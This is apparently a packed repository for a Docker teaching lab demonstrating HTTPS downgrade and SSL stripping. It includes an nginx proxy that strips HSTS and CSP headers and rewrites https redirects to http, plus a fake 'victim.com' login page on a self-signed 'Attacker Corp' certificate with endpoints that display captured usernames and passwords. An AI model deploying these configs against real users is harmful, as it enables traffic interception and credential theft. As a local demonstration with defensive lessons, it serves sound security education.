This file is a merged representation of a subset of the codebase, containing files not matching ignore patterns, combined into a single document by Repomix.
The content has been processed where comments have been removed.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching these patterns are excluded: node_modules/, bin/, obj/, repomix-output.xml, .repomixignore, .gitignore, .gitattribute, .vscode/, .vs/
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Code comments have been removed from supported file types
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
.devcontainer/devcontainer.json
.docs/repomix-output.xml
.hintrc
docker-compose.yml
proxy/nginx.conf
scripts/demo.sh
scripts/mkcert.sh
scripts/start.sh
scripts/test-endpoints.sh
scripts/test-setup.sh
scripts/validate.sh
upstream/index.html
upstream/init.sh
upstream/nginx.conf.template
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path=".devcontainer/devcontainer.json">
{
  "name": "https-strip-lab",
  "features": {
    "ghcr.io/devcontainers/features/docker-in-docker:2": {
      "version": "latest"
    }
  },
  "postCreateCommand": "bash scripts/mkcert.sh && docker compose up -d",
  "customizations": {
    "codespaces": {
      "openFiles": ["README.md"]
    }
  },
  "forwardPorts": [80, 443]
}
</file>

<file path=".docs/repomix-output.xml">
This file is a merged representation of a subset of the codebase, containing files not matching ignore patterns, combined into a single document by Repomix.
The content has been processed where comments have been removed.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching these patterns are excluded: node_modules/, bin/, obj/, repomix-output.xml, .repomixignore, .gitignore, .gitattribute, .vscode/, .vs/
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Code comments have been removed from supported file types
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
.devcontainer/devcontainer.json
.hintrc
docker-compose.yml
proxy/nginx.conf
scripts/mkcert.sh
upstream/index.html
upstream/init.sh
upstream/nginx.conf.template
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path=".devcontainer/devcontainer.json">
{
  "name": "https-strip-lab",
  "features": {
    "ghcr.io/devcontainers/features/docker-in-docker:2": {
      "version": "latest"
    }
  },
  "postCreateCommand": "bash scripts/mkcert.sh && docker compose up -d",
  "customizations": {
    "codespaces": {
      "openFiles": ["README.md"]
    }
  },
  "forwardPorts": [80, 443]
}
</file>

<file path=".hintrc">
{
  "extends": [
    "development"
  ],
  "hints": {
    "no-inline-styles": "off"
  }
}
</file>

<file path="scripts/mkcert.sh">
ls -l certs/victim.local.crt certs/victim.local.key

openssl req -x509 -nodes -newkey rsa:2048 -days 3650 \
  -subj "/CN=victim.local" \
  -keyout certs/victim.local.key -out certs/victim.local.crt
</file>

<file path="upstream/index.html">
<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HTTPS Strip Demo</title></head>
<body style="font:16px system-ui;margin:2rem;">
  <h1>HTTPS Strip Demo (PWD-safe)</h1>
  <p>Upstream is HTTPS; proxy on port 80 tries to downgrade any HTTPS redirects/links.</p>
  <ul>
    <li><a id="httpsLink" href="#">HTTPS link to /secure</a></li>
    <li><a id="httpLink"  href="#">HTTP link to /insecure</a></li>
  </ul>
  <p id="hsts"></p>
  <script>
    const host = location.host;
    document.getElementById('httpsLink').href = `https://${host}/secure`;
    document.getElementById('httpLink').href  = `http://${host}/insecure`;
    fetch("/", { method:"HEAD" }).then(r=>{
      const h=r.headers.get("strict-transport-security");
      document.getElementById("hsts").textContent = "HSTS header: " + (h || "absent");
    });
  </script>
</body>
</html>
</file>

<file path="upstream/init.sh">
if [ "$HSTS" = "on" ]; then
    export HSTS_HEADER="max-age=31536000; includeSubDomains; preload"
else
    export HSTS_HEADER=""
fi

echo "HSTS setting: $HSTS"
echo "HSTS_HEADER: $HSTS_HEADER"
</file>

<file path="upstream/nginx.conf.template">
server {
  listen 443 ssl;
  server_name _;

  ssl_certificate     /etc/nginx/certs/victim.local.crt;
  ssl_certificate_key /etc/nginx/certs/victim.local.key;

  # This will be replaced by envsubst
  # add_header Strict-Transport-Security "${HSTS_HEADER}" always;

  root /usr/share/nginx/html;
  index index.html;

  location / { try_files $uri /index.html; }
  location = /secure   { return 200 "secure content\n"; }
  location = /insecure { return 200 "insecure content\n"; }
}
</file>

<file path="proxy/nginx.conf">
worker_processes auto;
events { worker_connections 1024; }
http {
  resolver 127.0.0.11 ipv6=off valid=10s;
  resolver_timeout 2s;

  # rewrite https://host/... -> http://host/...
  map $upstream_http_location $rewritten_location {
    default $upstream_http_location;
    ~^https://([^/]+)(/?.*)$ http://$1$2;
  }

  # variable to make nginx resolve at request time (not startup)
  map "" $u_host { default "upstream"; }

  server {
    listen 80;
    server_name _;

    location / {
      proxy_pass https://$u_host:443;
      proxy_connect_timeout 2s;
      proxy_read_timeout 10s;
      proxy_send_timeout 10s;

      proxy_ssl_server_name on;
      proxy_ssl_name $u_host;
      proxy_ssl_verify off;

      proxy_hide_header Strict-Transport-Security;
      proxy_hide_header Content-Security-Policy;

      proxy_redirect off;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto http;

      proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
      proxy_intercept_errors on;
      error_page 301 302 307 308 = @handle_redirect;
    }

    location @handle_redirect {
      internal;
      add_header Location $rewritten_location always;
      return 302;
    }
  }
}
</file>

<file path="docker-compose.yml">
services:
  proxy:
    image: nginx:alpine
    container_name: hs_proxy
    ports: ["80:80"]
    volumes:
      - ./proxy/nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on:
      upstream:
        condition: service_healthy
    networks:
      lab:

  upstream:
    image: nginx:alpine
    container_name: hs_upstream
    environment:
      HSTS: "off"
      HSTS_HEADER: ""  # Will be set by init script
    volumes:
      - ./upstream/nginx.conf.template:/etc/nginx/templates/nginx.conf.template:ro
      - ./upstream/index.html:/usr/share/nginx/html/index.html:ro
      - ./certs:/etc/nginx/certs:ro
      - ./upstream/init.sh:/docker-entrypoint.d/10-init-hsts.sh:ro
    healthcheck:
      test: ["CMD", "sh", "-c", "apk add --no-cache curl >/dev/null 2>&1 || true; curl -kfs https://localhost/secure"]
      interval: 5s
      timeout: 3s
      retries: 12
    networks:
      lab:
        aliases:
          - upstream
    restart: unless-stopped

networks:
  lab: {}
</file>

</files>
</file>

<file path=".hintrc">
{
  "extends": [
    "development"
  ],
  "hints": {
    "no-inline-styles": "off"
  }
}
</file>

<file path="scripts/start.sh">
echo "=== HTTPS Strip Demo Lab Setup ==="


chmod +x scripts/mkcert.sh
chmod +x upstream/init.sh


echo "1. Generating SSL certificates..."
bash scripts/mkcert.sh


echo "2. Starting containers..."
docker-compose down 2>/dev/null
docker-compose up -d


echo "3. Waiting for containers to be healthy..."
sleep 5


echo "4. Testing the setup..."
echo ""
echo "Testing HTTPS upstream directly:"
curl -k -s https://localhost:8443/secure 2>/dev/null && echo "✓ HTTPS upstream working" || echo "✗ HTTPS upstream failed"

echo ""
echo "Testing HTTP proxy:"
curl -s http://localhost/secure 2>/dev/null && echo "✓ HTTP proxy working" || echo "✗ HTTP proxy failed"

echo ""
echo "=== Demo Ready ==="
echo "• Open http://localhost in your browser"
echo "• The proxy strips HTTPS and removes HSTS headers"
echo "• Toggle HSTS with: docker-compose exec upstream sh -c 'export HSTS=on && /docker-entrypoint.d/10-init-hsts.sh'"
echo ""
echo "View logs with: docker-compose logs -f"
</file>

<file path="scripts/test-endpoints.sh">
echo "🧪 Testing All Demo Endpoints"
echo "============================="

base_url="localhost"
failed=0

test_endpoint() {
    local url="$1"
    local expected="$2"
    local description="$3"

    echo -n "Testing $description... "

    if curl -k -s --max-time 10 "$url" | grep -q "$expected"; then
        echo "✅"
    else
        echo "❌"
        failed=$((failed + 1))
    fi
}

echo ""
echo "🔗 HTTP Endpoints (Port 80):"
test_endpoint "http://$base_url/" "DNS Poisoning" "DNS poisoning landing page"
test_endpoint "http://$base_url/phish" "Login to victim.local" "HTTP phishing page"
test_endpoint "http://$base_url/steal-creds?username=test&password=test" "Attack Successful" "Credential theft simulation"

echo ""
echo "🔒 Fake HTTPS Endpoints (Port 8443):"
test_endpoint "https://$base_url:8443/fake-victim" "Secure.*victim.local" "Fake HTTPS victim site"
test_endpoint "https://$base_url:8443/steal-https-creds?username=test&password=test" "HTTPS Attack Successful" "HTTPS credential theft"

echo ""
echo "🛡️ Legitimate HTTPS Endpoints (Port 9443):"
test_endpoint "https://$base_url:9443/secure" "REAL victim.local" "Legitimate secure content"
test_endpoint "https://$base_url:9443/login" "Secure Login" "Legitimate login page"

echo ""
if [ $failed -eq 0 ]; then
    echo "🎉 All endpoints working correctly!"
    echo ""
    echo "📱 Play with Docker URLs ready:"
    echo "   HTTP:  http://ip...-80.direct.labs.play-with-docker.com/"
    echo "   Fake:  https://ip...-8443.direct.labs.play-with-docker.com/"
    echo "   Real:  https://ip...-9443.direct.labs.play-with-docker.com/"
else
    echo "💥 $failed endpoints failed!"
    echo "Check the docker-compose logs for details"
    exit 1
fi
</file>

<file path="scripts/test-setup.sh">
echo "=== Testing HTTPS Strip Demo Setup ==="


echo "1. Testing upstream HTTPS directly..."
echo "Testing /secure endpoint:"
curl -k -v https://localhost:8443/secure 2>&1 | grep -E "(HTTP|SSL|TLS|> GET|< HTTP)"

echo ""
echo "2. Testing upstream container internally..."
docker-compose exec upstream curl -k -s https://localhost/secure && echo "✓ Internal HTTPS working"

echo ""
echo "3. Testing proxy HTTP..."
echo "Testing /secure via proxy:"
curl -v http://localhost/secure 2>&1 | grep -E "(HTTP|> GET|< HTTP|Connection)"

echo ""
echo "4. Testing proxy with insecure endpoint..."
curl -v http://localhost/insecure 2>&1 | grep -E "(HTTP|> GET|< HTTP)"

echo ""
echo "5. Checking container logs..."
echo "=== Upstream logs ==="
docker-compose logs upstream | tail -5

echo "=== Proxy logs ==="
docker-compose logs proxy | tail -5

echo ""
echo "6. Testing direct container networking..."
docker-compose exec proxy curl -k -s https://upstream:443/secure && echo "✓ Proxy->Upstream connection working"
</file>

<file path="scripts/validate.sh">
echo "🔍 Pre-Deployment Validation"
echo "============================"

errors=0


required_files=(
    "proxy/nginx.conf"
    "upstream/nginx.conf.template"
    "upstream/init.sh"
    "upstream/index.html"
    "docker-compose.yml"
    "scripts/mkcert.sh"
)

echo "1️⃣ Checking required files..."
for file in "${required_files[@]}"; do
    if [ -f "$file" ]; then
        echo "✅ $file"
    else
        echo "❌ $file - MISSING"
        errors=$((errors + 1))
    fi
done


echo ""
echo "2️⃣ Validating nginx configuration..."
if docker run --rm -v "$(pwd)/proxy/nginx.conf:/tmp/nginx.conf:ro" nginx:alpine nginx -t -c /tmp/nginx.conf 2>/dev/null; then
    echo "✅ proxy/nginx.conf syntax valid"
else
    echo "❌ proxy/nginx.conf syntax invalid"
    errors=$((errors + 1))
fi


echo ""
echo "3️⃣ Validating docker-compose..."
if docker-compose config >/dev/null 2>&1; then
    echo "✅ docker-compose.yml valid"
else
    echo "❌ docker-compose.yml invalid"
    errors=$((errors + 1))
fi


echo ""
echo "4️⃣ Checking for port conflicts..."
ports_to_check=(80 8443 9443)
for port in "${ports_to_check[@]}"; do
    if netstat -tuln 2>/dev/null | grep -q ":$port " || ss -tuln 2>/dev/null | grep -q ":$port "; then
        echo "⚠️  Port $port is already in use"
    else
        echo "✅ Port $port available"
    fi
done


echo ""
echo "5️⃣ Checking script permissions..."
scripts=("scripts/mkcert.sh" "upstream/init.sh")
for script in "${scripts[@]}"; do
    if [ -x "$script" ]; then
        echo "✅ $script is executable"
    else
        echo "⚠️  $script not executable (will be fixed during setup)"
    fi
done

echo ""
if [ $errors -eq 0 ]; then
    echo "🎉 VALIDATION PASSED - Ready for deployment!"
    echo ""
    echo "Run: ./demo.sh"
else
    echo "💥 VALIDATION FAILED - $errors errors found"
    echo "Fix the issues above before deployment"
    exit 1
fi
</file>

<file path="scripts/demo.sh">
set -e

echo "🚨 HTTPS Downgrade Attack Demo 🚨"
echo "================================="
echo "Simulates DNS poisoning + HTTPS downgrade + Fake HTTPS redirect"


mkdir -p proxy upstream scripts certs
chmod +x scripts/mkcert.sh upstream/init.sh 2>/dev/null || true


echo ""
echo "1️⃣ Generating attacker's SSL certificate..."
bash scripts/mkcert.sh

# Start containers
echo ""
echo "2️⃣ Starting attack infrastructure..."
docker-compose down 2>/dev/null || true
docker-compose up -d

# Wait for startup
echo ""
echo "3️⃣ Waiting for containers to initialize..."
sleep 5

# Test endpoints
echo ""
echo "4️⃣ Testing attack chain..."

echo -n "Testing HTTP downgrade page... "
if curl -s --max-time 5 "http://localhost/" | grep -q "HTTPS Downgrade"; then
    echo "✅"
else
    echo "❌"
fi

echo -n "Testing fake HTTPS site... "
if curl -k -s --max-time 5 "https://localhost:8443/victim-site" | grep -q "victim.com"; then
    echo "✅"
else
    echo "❌"
fi

echo ""
echo "🎯 REALISTIC ATTACK DEMO READY!"
echo "==============================="
echo ""
echo "📱 For Play with Docker:"
echo ""
echo "🔗 Attack Flow URLs:"
echo "   Step 1: https://ip...-80.direct.labs.play-with-docker.com/secure"
echo "           ↳ User types HTTPS but gets HTTP (no 443 service)"
echo ""
echo "   Step 2: http://ip...-80.direct.labs.play-with-docker.com/"
echo "           ↳ Shows downgrade attack page"
echo ""
echo "   Step 3: https://ip...-8443.direct.labs.play-with-docker.com/victim-site"
echo "           ↳ Fake HTTPS site with 'valid' certificate"
echo ""
echo "🎭 Attack Demonstration:"
echo "   1. User expects secure HTTPS connection"
echo "   2. DNS poisoning + no HTTPS service = HTTP fallback"
echo "   3. HTTP page redirects to attacker's legitimate HTTPS site"
echo "   4. Users trust the lock icon and enter credentials"
echo "   5. Attacker has valid HTTPS cert but wrong domain"
echo ""
echo "💡 Key Learning:"
echo "   • Always check the actual domain name, not just the lock icon"
echo "   • HSTS prevents protocol downgrades"
echo "   • Certificate pinning helps prevent domain spoofing"
echo ""
echo "🔍 Test the attack:"
echo "   1. Try to visit: https://ip...-80.direct.labs.play-with-docker.com/secure"
echo "   2. Notice browser falls back to HTTP"
echo "   3. Follow redirect to fake HTTPS site"
echo "   4. Check certificate details vs domain name"

echo ""
echo "📊 Container Status:"
docker-compose ps

echo ""
echo "🚀 Ready for demonstration!"
</file>

<file path="upstream/index.html">
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>DNS Poisoning Attack Demo</title>
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; line-height: 1.6; }
    .attack { background: #ffe6e6; padding: 1rem; border: 2px solid #ff0000; }
    .legitimate { background: #e6ffe6; padding: 1rem; border: 2px solid #00aa00; }
    .warning { background: #fff3cd; padding: 1rem; border: 2px solid #ffcc00; }
  </style>
</head>
<body>
  <h1>🚨 DNS Poisoning Attack Demo</h1>

  <div class="warning">
    <h2>⚠️ Demo Purpose</h2>
    <p>This demonstrates how DNS poisoning can downgrade HTTPS to HTTP, enabling man-in-the-middle attacks.</p>
  </div>

  <div class="attack">
    <h2>🎯 Attack Scenario</h2>
    <p><strong>Current page:</strong> <span id="currentUrl"></span></p>
    <p><strong>Protocol:</strong> <span id="protocol"></span></p>
    <p><strong>Security:</strong> <span id="security"></span></p>
  </div>

  <h2>🔗 Demo Links</h2>
  <ul>
    <li><a href="/phish">🎣 Fake Login Page (HTTP)</a></li>
    <li><a href="/legitimate">🔒 Compare with Legitimate Site (HTTPS)</a></li>
  </ul>

  <script>
    // Show current page details
    document.getElementById('currentUrl').textContent = window.location.href;
    document.getElementById('protocol').textContent = window.location.protocol;

    const isSecure = window.location.protocol === 'https:';
    document.getElementById('security').textContent = isSecure ?
      '✅ Encrypted (Safe)' :
      '❌ Unencrypted (Vulnerable to attacks!)';

    // Change styling based on security
    if (!isSecure) {
      document.body.style.backgroundColor = '#ffe6e6';
    }
  </script>
</body>
</html>
</file>

<file path="upstream/init.sh">
if [ "$HSTS" = "on" ]; then
    export HSTS_HEADER="max-age=31536000; includeSubDomains; preload"
else
    export HSTS_HEADER=""
fi

echo "HSTS setting: $HSTS"
echo "HSTS_HEADER: '$HSTS_HEADER'"
</file>

<file path="scripts/mkcert.sh">
set -e

echo "Generating SSL certificate for HTTPS downgrade attack demo"
echo "============================================================="

mkdir -p certs



if [ ! -f "certs/attacker.crt" ]; then
    echo "Generating attacker's certificate..."
    echo "This simulates an attacker who has a valid certificate for their domain"


    openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
      -subj "/CN=*.direct.labs.play-with-docker.com/O=Attacker Corp/C=US/ST=California/L=San Francisco" \
      -keyout certs/attacker.key \
      -out certs/attacker.crt

    echo "✅ Attacker certificate generated"
else
    echo "✅ Attacker certificate already exists"
fi

echo ""
echo "📋 Certificate Details:"
openssl x509 -in certs/attacker.crt -text -noout | grep -E "(Subject:|Issuer:|Not After)"

echo ""
echo "Files created:"
ls -la certs/

echo ""
echo "✅ Certificate setup complete!"
echo ""
echo "Attack Flow:"
echo "1. User types: https://example...direct.labs.play-with-docker.com/secure"
echo "2. DNS poisoning points to your server"
echo "3. No HTTPS service on port 443 → Browser falls back to HTTP (port 80)"
echo "4. HTTP site redirects to fake HTTPS site (port 8443)"
echo "5. Fake HTTPS site has 'valid' certificate and steals credentials"
</file>

<file path="upstream/nginx.conf.template">
server {
  listen 8443 ssl;
  server_name _;

  # Use a certificate that matches the Play with Docker domain
  # This simulates an attacker who has obtained a valid certificate for their domain
  ssl_certificate /etc/nginx/certs/attacker.crt;
  ssl_certificate_key /etc/nginx/certs/attacker.key;
  ssl_protocols TLSv1.2 TLSv1.3;

  # Attacker's site looks legitimate with proper security headers
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
  add_header X-Frame-Options "DENY" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Attacker-Site "true" always;

  root /usr/share/nginx/html;
  index index.html;

  # Fake victim site that looks legitimate
  location /victim-site {
    return 200 '<!DOCTYPE html>
<html><head><title>Secure Login - victim.com</title>
<style>
  body { font-family: sans-serif; padding: 20px; background: #f8f9fa; }
  .secure { background: #d4edda; padding: 15px; border: 1px solid #28a745; margin: 15px 0; }
  .form-container { background: white; padding: 20px; border: 1px solid #ddd; max-width: 400px; }
  input { padding: 10px; width: 100%; margin: 10px 0; border: 1px solid #ddd; }
  button { padding: 12px 20px; background: #28a745; color: white; border: none; width: 100%; }
</style>
</head>
<body>
<h1>victim.com - Secure Portal</h1>

<div class="secure">
<h3>Secure Connection Established</h3>
<p><strong>This site appears secure because:</strong></p>
<ul>
<li>Valid HTTPS certificate</li>
<li>Legitimate-looking domain</li>
<li>Security headers present</li>
<li>Green lock icon in browser</li>
</ul>
</div>

<div class="form-container">
<h3>Login to Your Account</h3>
<form method="get" action="/steal-secure-creds">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Secure Login</button>
</form>
</div>

<div style="background: #fff3cd; padding: 10px; margin: 15px 0; border: 1px solid #ffeaa7;">
<h4>Attack Analysis:</h4>
<p><strong>Why this attack works:</strong></p>
<ul>
<li>User typed https://victim.com but DNS was poisoned</li>
<li>Browser fell back to HTTP, then got redirected here</li>
<li>This HTTPS site has a valid certificate (for attacker domain)</li>
<li>Users see the lock icon and trust it</li>
<li>Domain confusion: users don'\''t always check the URL carefully</li>
</ul>
</div>

<p><small>Notice: Check the certificate details and domain name!</small></p>
</body></html>';
  }

  # Handle credential theft on the "secure" site
  location = /steal-secure-creds {
    return 200 '<!DOCTYPE html>
<html><head><title>Advanced Attack Successful!</title>
<style>body{font-family:sans-serif;padding:20px;background:#ffe6e6;}</style>
</head>
<body>
<h2>Advanced HTTPS Attack Successful!</h2>

<div style="background: #f8d7da; padding: 15px; border: 1px solid #f5c6cb; margin: 15px 0;">
<h3>Credentials Captured via "Secure" HTTPS:</h3>
<ul>
<li><strong>Username:</strong> <code>$arg_username</code></li>
<li><strong>Password:</strong> <code>$arg_password</code></li>
<li><strong>Attack Method:</strong> HTTPS with valid certificate</li>
<li><strong>Domain:</strong> $host (not victim.com!)</li>
<li><strong>User IP:</strong> $remote_addr</li>
</ul>
</div>

<div style="background: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; margin: 15px 0;">
<h3>Why This Attack Succeeded:</h3>
<ol>
<li><strong>DNS Poisoning:</strong> victim.com pointed to attacker IP</li>
<li><strong>Protocol Downgrade:</strong> HTTPS → HTTP → HTTPS redirect</li>
<li><strong>Valid Certificate:</strong> HTTPS site has legitimate SSL cert</li>
<li><strong>User Trust:</strong> Lock icon made it look secure</li>
<li><strong>Domain Confusion:</strong> Users didn'\''t verify the actual domain</li>
</ol>
</div>

<h3>How to Protect Against This:</h3>
<ul>
<li>Always verify the domain name in the address bar</li>
<li>Check certificate details (click the lock icon)</li>
<li>Use HSTS to prevent protocol downgrades</li>
<li>Use DNS over HTTPS (DoH) to prevent DNS poisoning</li>
<li>Be suspicious of unexpected redirects</li>
</ul>

<p><a href="/victim-site">← Back to fake login</a></p>
</body></html>';
  }

  # Default page
  location / {
    return 302 /victim-site;
  }
}
</file>

<file path="proxy/nginx.conf">
worker_processes auto;
events { worker_connections 1024; }

http {
  resolver 127.0.0.11 ipv6=off valid=10s;

  # HTTP Server - This is where victims land when HTTPS is not available
  # Simulates the downgrade attack when user types https://example.com but gets HTTP
  server {
    listen 80;
    server_name _;

    # Log the attack for demonstration
    access_log /var/log/nginx/attack.log;

    location / {
      add_header X-Attack-Vector "HTTPS-Downgrade-to-HTTP" always;
      add_header X-Original-Request "https://$host$request_uri" always;
      
      return 200 '<!DOCTYPE html>
<html><head><title>Connection Downgraded - Security Warning</title>
<style>
  body { font-family: sans-serif; padding: 20px; background: #fff3cd; }
  .warning { background: #f8d7da; padding: 15px; border: 1px solid #f5c6cb; margin: 15px 0; }
  .attack { background: #ffe6e6; padding: 15px; border: 1px solid #ff0000; margin: 15px 0; }
</style>
</head>
<body>
<h1>HTTPS Downgrade Attack in Progress</h1>

<div class="warning">
<h3>What just happened:</h3>
<ol>
<li>You requested: <strong>https://$host$request_uri</strong></li>
<li>DNS poisoning pointed you to attacker server</li>
<li>No HTTPS service running → Browser fell back to HTTP</li>
<li>You are now on an UNENCRYPTED connection!</li>
</ol>
</div>

<div class="attack">
<h3>Attack Demonstration:</h3>
<p>In a real attack, this HTTP page could:</p>
<ul>
<li>Steal your credentials in plaintext</li>
<li>Inject malicious scripts</li>
<li>Redirect you to a fake "secure" site</li>
<li>Intercept all your data</li>
</ul>
</div>

<h3>Next Steps:</h3>
<p><strong>The attacker will now redirect you to their "legitimate" HTTPS site...</strong></p>
<p><a href="/redirect-to-fake-https" style="padding: 10px 20px; background: #007cba; color: white; text-decoration: none;">
Continue to "Secure" Site →
</a></p>

<p><small>Current URL: $scheme://$host$request_uri</small></p>
</body></html>';
    }

    # Redirect to attacker's HTTPS site (with valid cert for their domain)
    location = /redirect-to-fake-https {
      # Redirect to the attacker's HTTPS site on port 8443
      return 302 https://$host:8443/victim-site;
    }

    # Direct credential harvesting on HTTP for demonstration
    location = /steal-http-creds {
      return 200 '<!DOCTYPE html>
<html><head><title>HTTP Credential Theft</title>
<style>body{font-family:sans-serif;padding:20px;background:#ffcccc;}</style>
</head>
<body>
<h2>HTTP Attack - Credentials Stolen!</h2>
<p><strong>Captured via unencrypted HTTP:</strong></p>
<ul>
<li>Username: <code>$arg_username</code></li>
<li>Password: <code>$arg_password</code></li>
<li>Method: Plaintext interception</li>
<li>Source: $remote_addr</li>
</ul>
<p>This happened because you were on HTTP instead of HTTPS!</p>
<p><a href="/redirect-to-fake-https">Now see the HTTPS version →</a></p>
</body></html>';
    }
  }
}
</file>

<file path="docker-compose.yml">
services:

  proxy:
    image: nginx:alpine
    container_name: downgrade_proxy
    ports:
      - "80:80"
    volumes:
      - ./proxy/nginx.conf:/etc/nginx/nginx.conf:ro
    networks:
      - attack_net


  attacker_https:
    image: nginx:alpine
    container_name: attacker_https_site
    ports:
      - "8443:8443"
    environment:
      HSTS: "on"
      HSTS_HEADER: "max-age=31536000; includeSubDomains; preload"
    volumes:
      - ./upstream/nginx.conf.template:/etc/nginx/templates/nginx.conf.template:ro
      - ./upstream/index.html:/usr/share/nginx/html/index.html:ro
      - ./certs:/etc/nginx/certs:ro
      - ./upstream/init.sh:/docker-entrypoint.d/10-init-hsts.sh:ro
    healthcheck:
      test: ["CMD", "sh", "-c", "apk add --no-cache curl >/dev/null 2>&1 || true; curl -kfs https://localhost:8443/victim-site"]
      interval: 5s
      timeout: 3s
      retries: 12
    networks:
      attack_net:
        aliases:
          - attacker_https
    restart: unless-stopped

networks:
  attack_net:
</file>

</files>
